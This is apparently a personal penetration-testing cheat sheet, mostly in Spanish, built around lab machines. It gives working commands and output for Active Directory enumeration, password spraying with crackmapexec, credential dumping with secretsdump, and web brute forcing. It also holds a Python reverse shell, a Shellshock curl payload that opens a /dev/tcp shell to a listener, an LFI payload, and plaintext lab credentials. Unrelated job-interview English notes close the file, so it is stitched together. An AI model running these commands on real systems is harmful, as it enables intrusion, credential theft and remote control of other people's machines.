ldapsearch -H ldap://flight.htb -x -s base -b '' "(objectClass=\*)" "\*" +
ldapsearch -x -h 192.168.194.165 -b “dc=heist,dc=offsec”

ENUMERACION

nmap -p- -Sp -vvv -A -T4 IP -o nmap\_ip
nmap -sU --top-ports 100 IP
nmap — script smb-vuln\* -p 139,445 -oN smb-vuln-scan $target
smbclient -L //ip -U ""
smblcient //ip/folder -U ""
enum4linux
enum4linux -u fmcsorley -p CrabSharkJellyfish192 -a 192.168.219.122 > enum4linux.txt

**\- Enumeracion crackmapexec**

#identficacion de usuarios

* [x] crackmapexec smb flight.htb -u svc\_apache -p 'S@Ss!K@\*t13' --users

└─# crackmapexec smb flight.htb -u svc\_apache -p 'S@Ss!K@\*t13' --users
SMB flight.htb 445 G0 [\*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB flight.htb 445 G0 [+] flight.htb\\svc\_apache:S@Ss!K@\*t13
SMB flight.htb 445 G0 [+] Enumerated domain user(s)
SMB flight.htb 445 G0 flight.htb\\O.Possum badpwdcount: 564 baddpwdtime: 2023-01-04 00:41:24.500844
SMB flight.htb 445 G0 flight.htb\\svc\_apache badpwdcount: 0 baddpwdtime: 2023-01-04 00:13:47.582627
SMB flight.htb 445 G0 flight.htb\\V.Stevens badpwdcount: 563 baddpwdtime: 2023-01-04 00:41:24.157063
SMB flight.htb 445 G0 flight.htb\\D.Truff badpwdcount: 563 baddpwdtime: 2023-01-04 00:41:23.875796
SMB flight.htb 445 G0 flight.htb\\I.Francis badpwdcount: 563 baddpwdtime: 2023-01-04 00:41:23.532053
SMB flight.htb 445 G0 flight.htb\\W.Walker badpwdcount: 563 baddpwdtime: 2023-01-04 00:41:23.172687
SMB flight.htb 445 G0 flight.htb\\C.Bum badpwdcount: 0 baddpwdtime: 2023-01-04 00:41:22.844568
SMB flight.htb 445 G0 flight.htb\\M.Gold badpwdcount: 563 baddpwdtime: 2023-01-04 00:41:22.500791
SMB flight.htb 445 G0 flight.htb\\L.Kein badpwdcount: 563 baddpwdtime: 2023-01-04 00:41:22.172637
SMB flight.htb 445 G0 flight.htb\\G.Lors badpwdcount: 563 baddpwdtime: 2023-01-04 00:41:21.828930
SMB flight.htb 445 G0 flight.htb\\R.Cold badpwdcount: 564 baddpwdtime: 2023-01-04 00:41:25.172699
SMB flight.htb 445 G0 flight.htb\\S.Moon badpwdcount: 7 baddpwdtime: 2023-01-04 00:41:24.828922
SMB flight.htb 445 G0 flight.htb\\krbtgt badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB flight.htb 445 G0 flight.htb\\Guest badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB flight.htb 445 G0 flight.htb\\Administrator badpwdcount: 1 baddpwdtime: 2023-01-04 00:09:53.030686
#Probar usuarios con contraseñas

* [x] └─# crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@\*t13' --continue-on-success

SMB flight.htb 445 G0 [\*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB flight.htb 445 G0 [-] flight.htb\\O.Possum:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [+] flight.htb\\svc\_apache:S@Ss!K@\*t13
SMB flight.htb 445 G0 [-] flight.htb\\V.Stevens:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [-] flight.htb\\D.Truff:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [-] flight.htb\\I.Francis:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [-] flight.htb\\W.Walker:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [-] flight.htb\\C.Bum:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [-] flight.htb\\M.Gold:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [-] flight.htb\\L.Kein:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [-] flight.htb\\G.Lors:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [-] flight.htb\\R.Cold:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [+] flight.htb\\S.Moon:S@Ss!K@\*t13
SMB flight.htb 445 G0 [-] flight.htb\\krbtgt:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [-] flight.htb\\Guest:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE
SMB flight.htb 445 G0 [-] flight.htb\\Administrator:S@Ss!K@\*t13 STATUS\_LOGON\_FAILURE

* [x] └─# Fuerzabruta usuarios
    kerbrute -domain heist.offsec -users /usr/share/wordlists/names.txt -dc-ip 192.168.194.165

NOTA si al ejecutar este comando "python3 set\_empty\_pw.py DC01 192.168.194.165" sale un succes, significa que se tiene null session y se puede hacer un secretsdump.py sun contraseña

#intentar escribir y obtener shell

* [x] impacket-psexec flight.htb/s.moon@g0.flight.htb

Password:
[\*] Requesting shares on g0.flight.htb.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[\*] Found writable share Shared
[\*] Uploading file oLnmoyYD.exe
[-] Error uploading file oLnmoyYD.exe, aborting.....
[-] Error performing the installation, cleaning up: SMB SessionError: STATUS\_ACCESS\_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

<br>
de lo anterior el unico que tiene para escribir es Shared, se usa https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini

<br>
* [x] **Ver Recursos compartidos con el usuario y password**

crackmapexec smb 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --shares

<br>
* [x] **Enumerar usuarios de AD**

GetADUsers.py -all -dc-ip 192.168.219.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192

GetNPUsers.py heist.offsec/ -dc-ip 192.168.194.165

<br>
* [x] **Volcado de password con usuario admin**

secretsdump.py hutch.offsec/administrator:‘9%GR6qN[.#)x4i’@192.168.219.122

* [x] Testing Access with the Cracked Password Using Crackmapexec
    crackmapexec smb 192.168.194.165 -u users.txt -p passwords.txt --continue-on-success \<puerto 445>
    crackmapexec winrm 192.168.194.165 -u users.txt -p passwords.txt --continue-on-success \<puerto 5985> (pwn3d!)
    evil-winrm -i 192.168.194.165 -u enox -p california

**#########DNS###############**
**Enumerar DNS Server###**
host -l 192.168.161.149#lo que se quiere buscar 192.168.161.149# (ip servidor)digpass axfr mailman.com @192.168.161.149
**-Buscar dominios fuerza burta por ip**
for ip in $\(seq 1 255\); do host 192\.168\.161\.$ip; done \| grep \-v "not found"
**-Buscar dominios fuerza bruta por listado**
for ip in $\(cat /usr/share/seclists/Discovery/DNS/subdomains\-top1mil\-5000\.txt\); do host $ip\.mailman\.com; done \|grep \-v "not found"\- Enumeracion de docminiodnsenum IP

#######WEB########
**\- Fuzzing**
dirb http://192.168.196.128/core
ffuf -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -u http://192.168.150.142/FUZZ
ffuf -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt -u http://192.168.150.142/FUZZ -e .php,.conf,.xml,.html
ffuf -u 'http://192.168.94.80/console/file.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -fs 0

**\- worpress bruteforce**
wpscan --url httpxxxx -U user -P Pass //Brute force
wpscan --url httpxxxx -e u //identifcar usuarios
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hw 530

<br>
##Reverseshell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("192.168.49.55",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

<br>
**\- Auth Basic \- brute force**
hydra 192.168.55.90 -l admin -P password.lst http-get

**\- Scan user auth**
gobuster dir -u http://192.168.55.90 -U admin -P Football -w ../rockyou.txt

**\- Shellshock**
curl -vvvv -H 'User-Agent: () { :; }; /bin/bash -c "uname -i"' http://10.11.1.71/cgi-bin/admin.cgi --- Respuesta EXITOSA!!!
curl -vvvv -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.192/9998 0>&1' http://10.11.1.71/cgi-bin/admin.cgi --- Se crea un revershell
nc -lnvp 9998 --- recibiendo revershell

**\- RCE**
https://www.revshells.com/

**\- LFI**

Lista: https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt

' and die(show\_source('/etc/passwd')) or '

\- RPC

rpcclient -U "" -N 10.10.10.161
enumdomusers
enumdomgroups
querygroup 0x200
querygroupmem 0x200
queryuser 0x1f4

\*\*\*- SNMP
nmap -sU -p161 --script *snmp* $target

Aplogize for my english, im improving every day

What is the Role?

Please you can speak slower
what are the benefits?
medical plan
Vacation
Trainings
Salary
I have to go the office or can i work from home?

currently, my main activities are : Pentest (apis or aplication customer), red team in the warehouse, social engeneer (phishing, vhishing. etc), i need to speak with diferents person in order to understan the new project or realease, every day teams create different things.

i have 13 year expirience, in the area cybersecurity i have 8 or 9 expirience. i worked in PwC, I did assestmen vulnerabilities in aplications, in ATM's.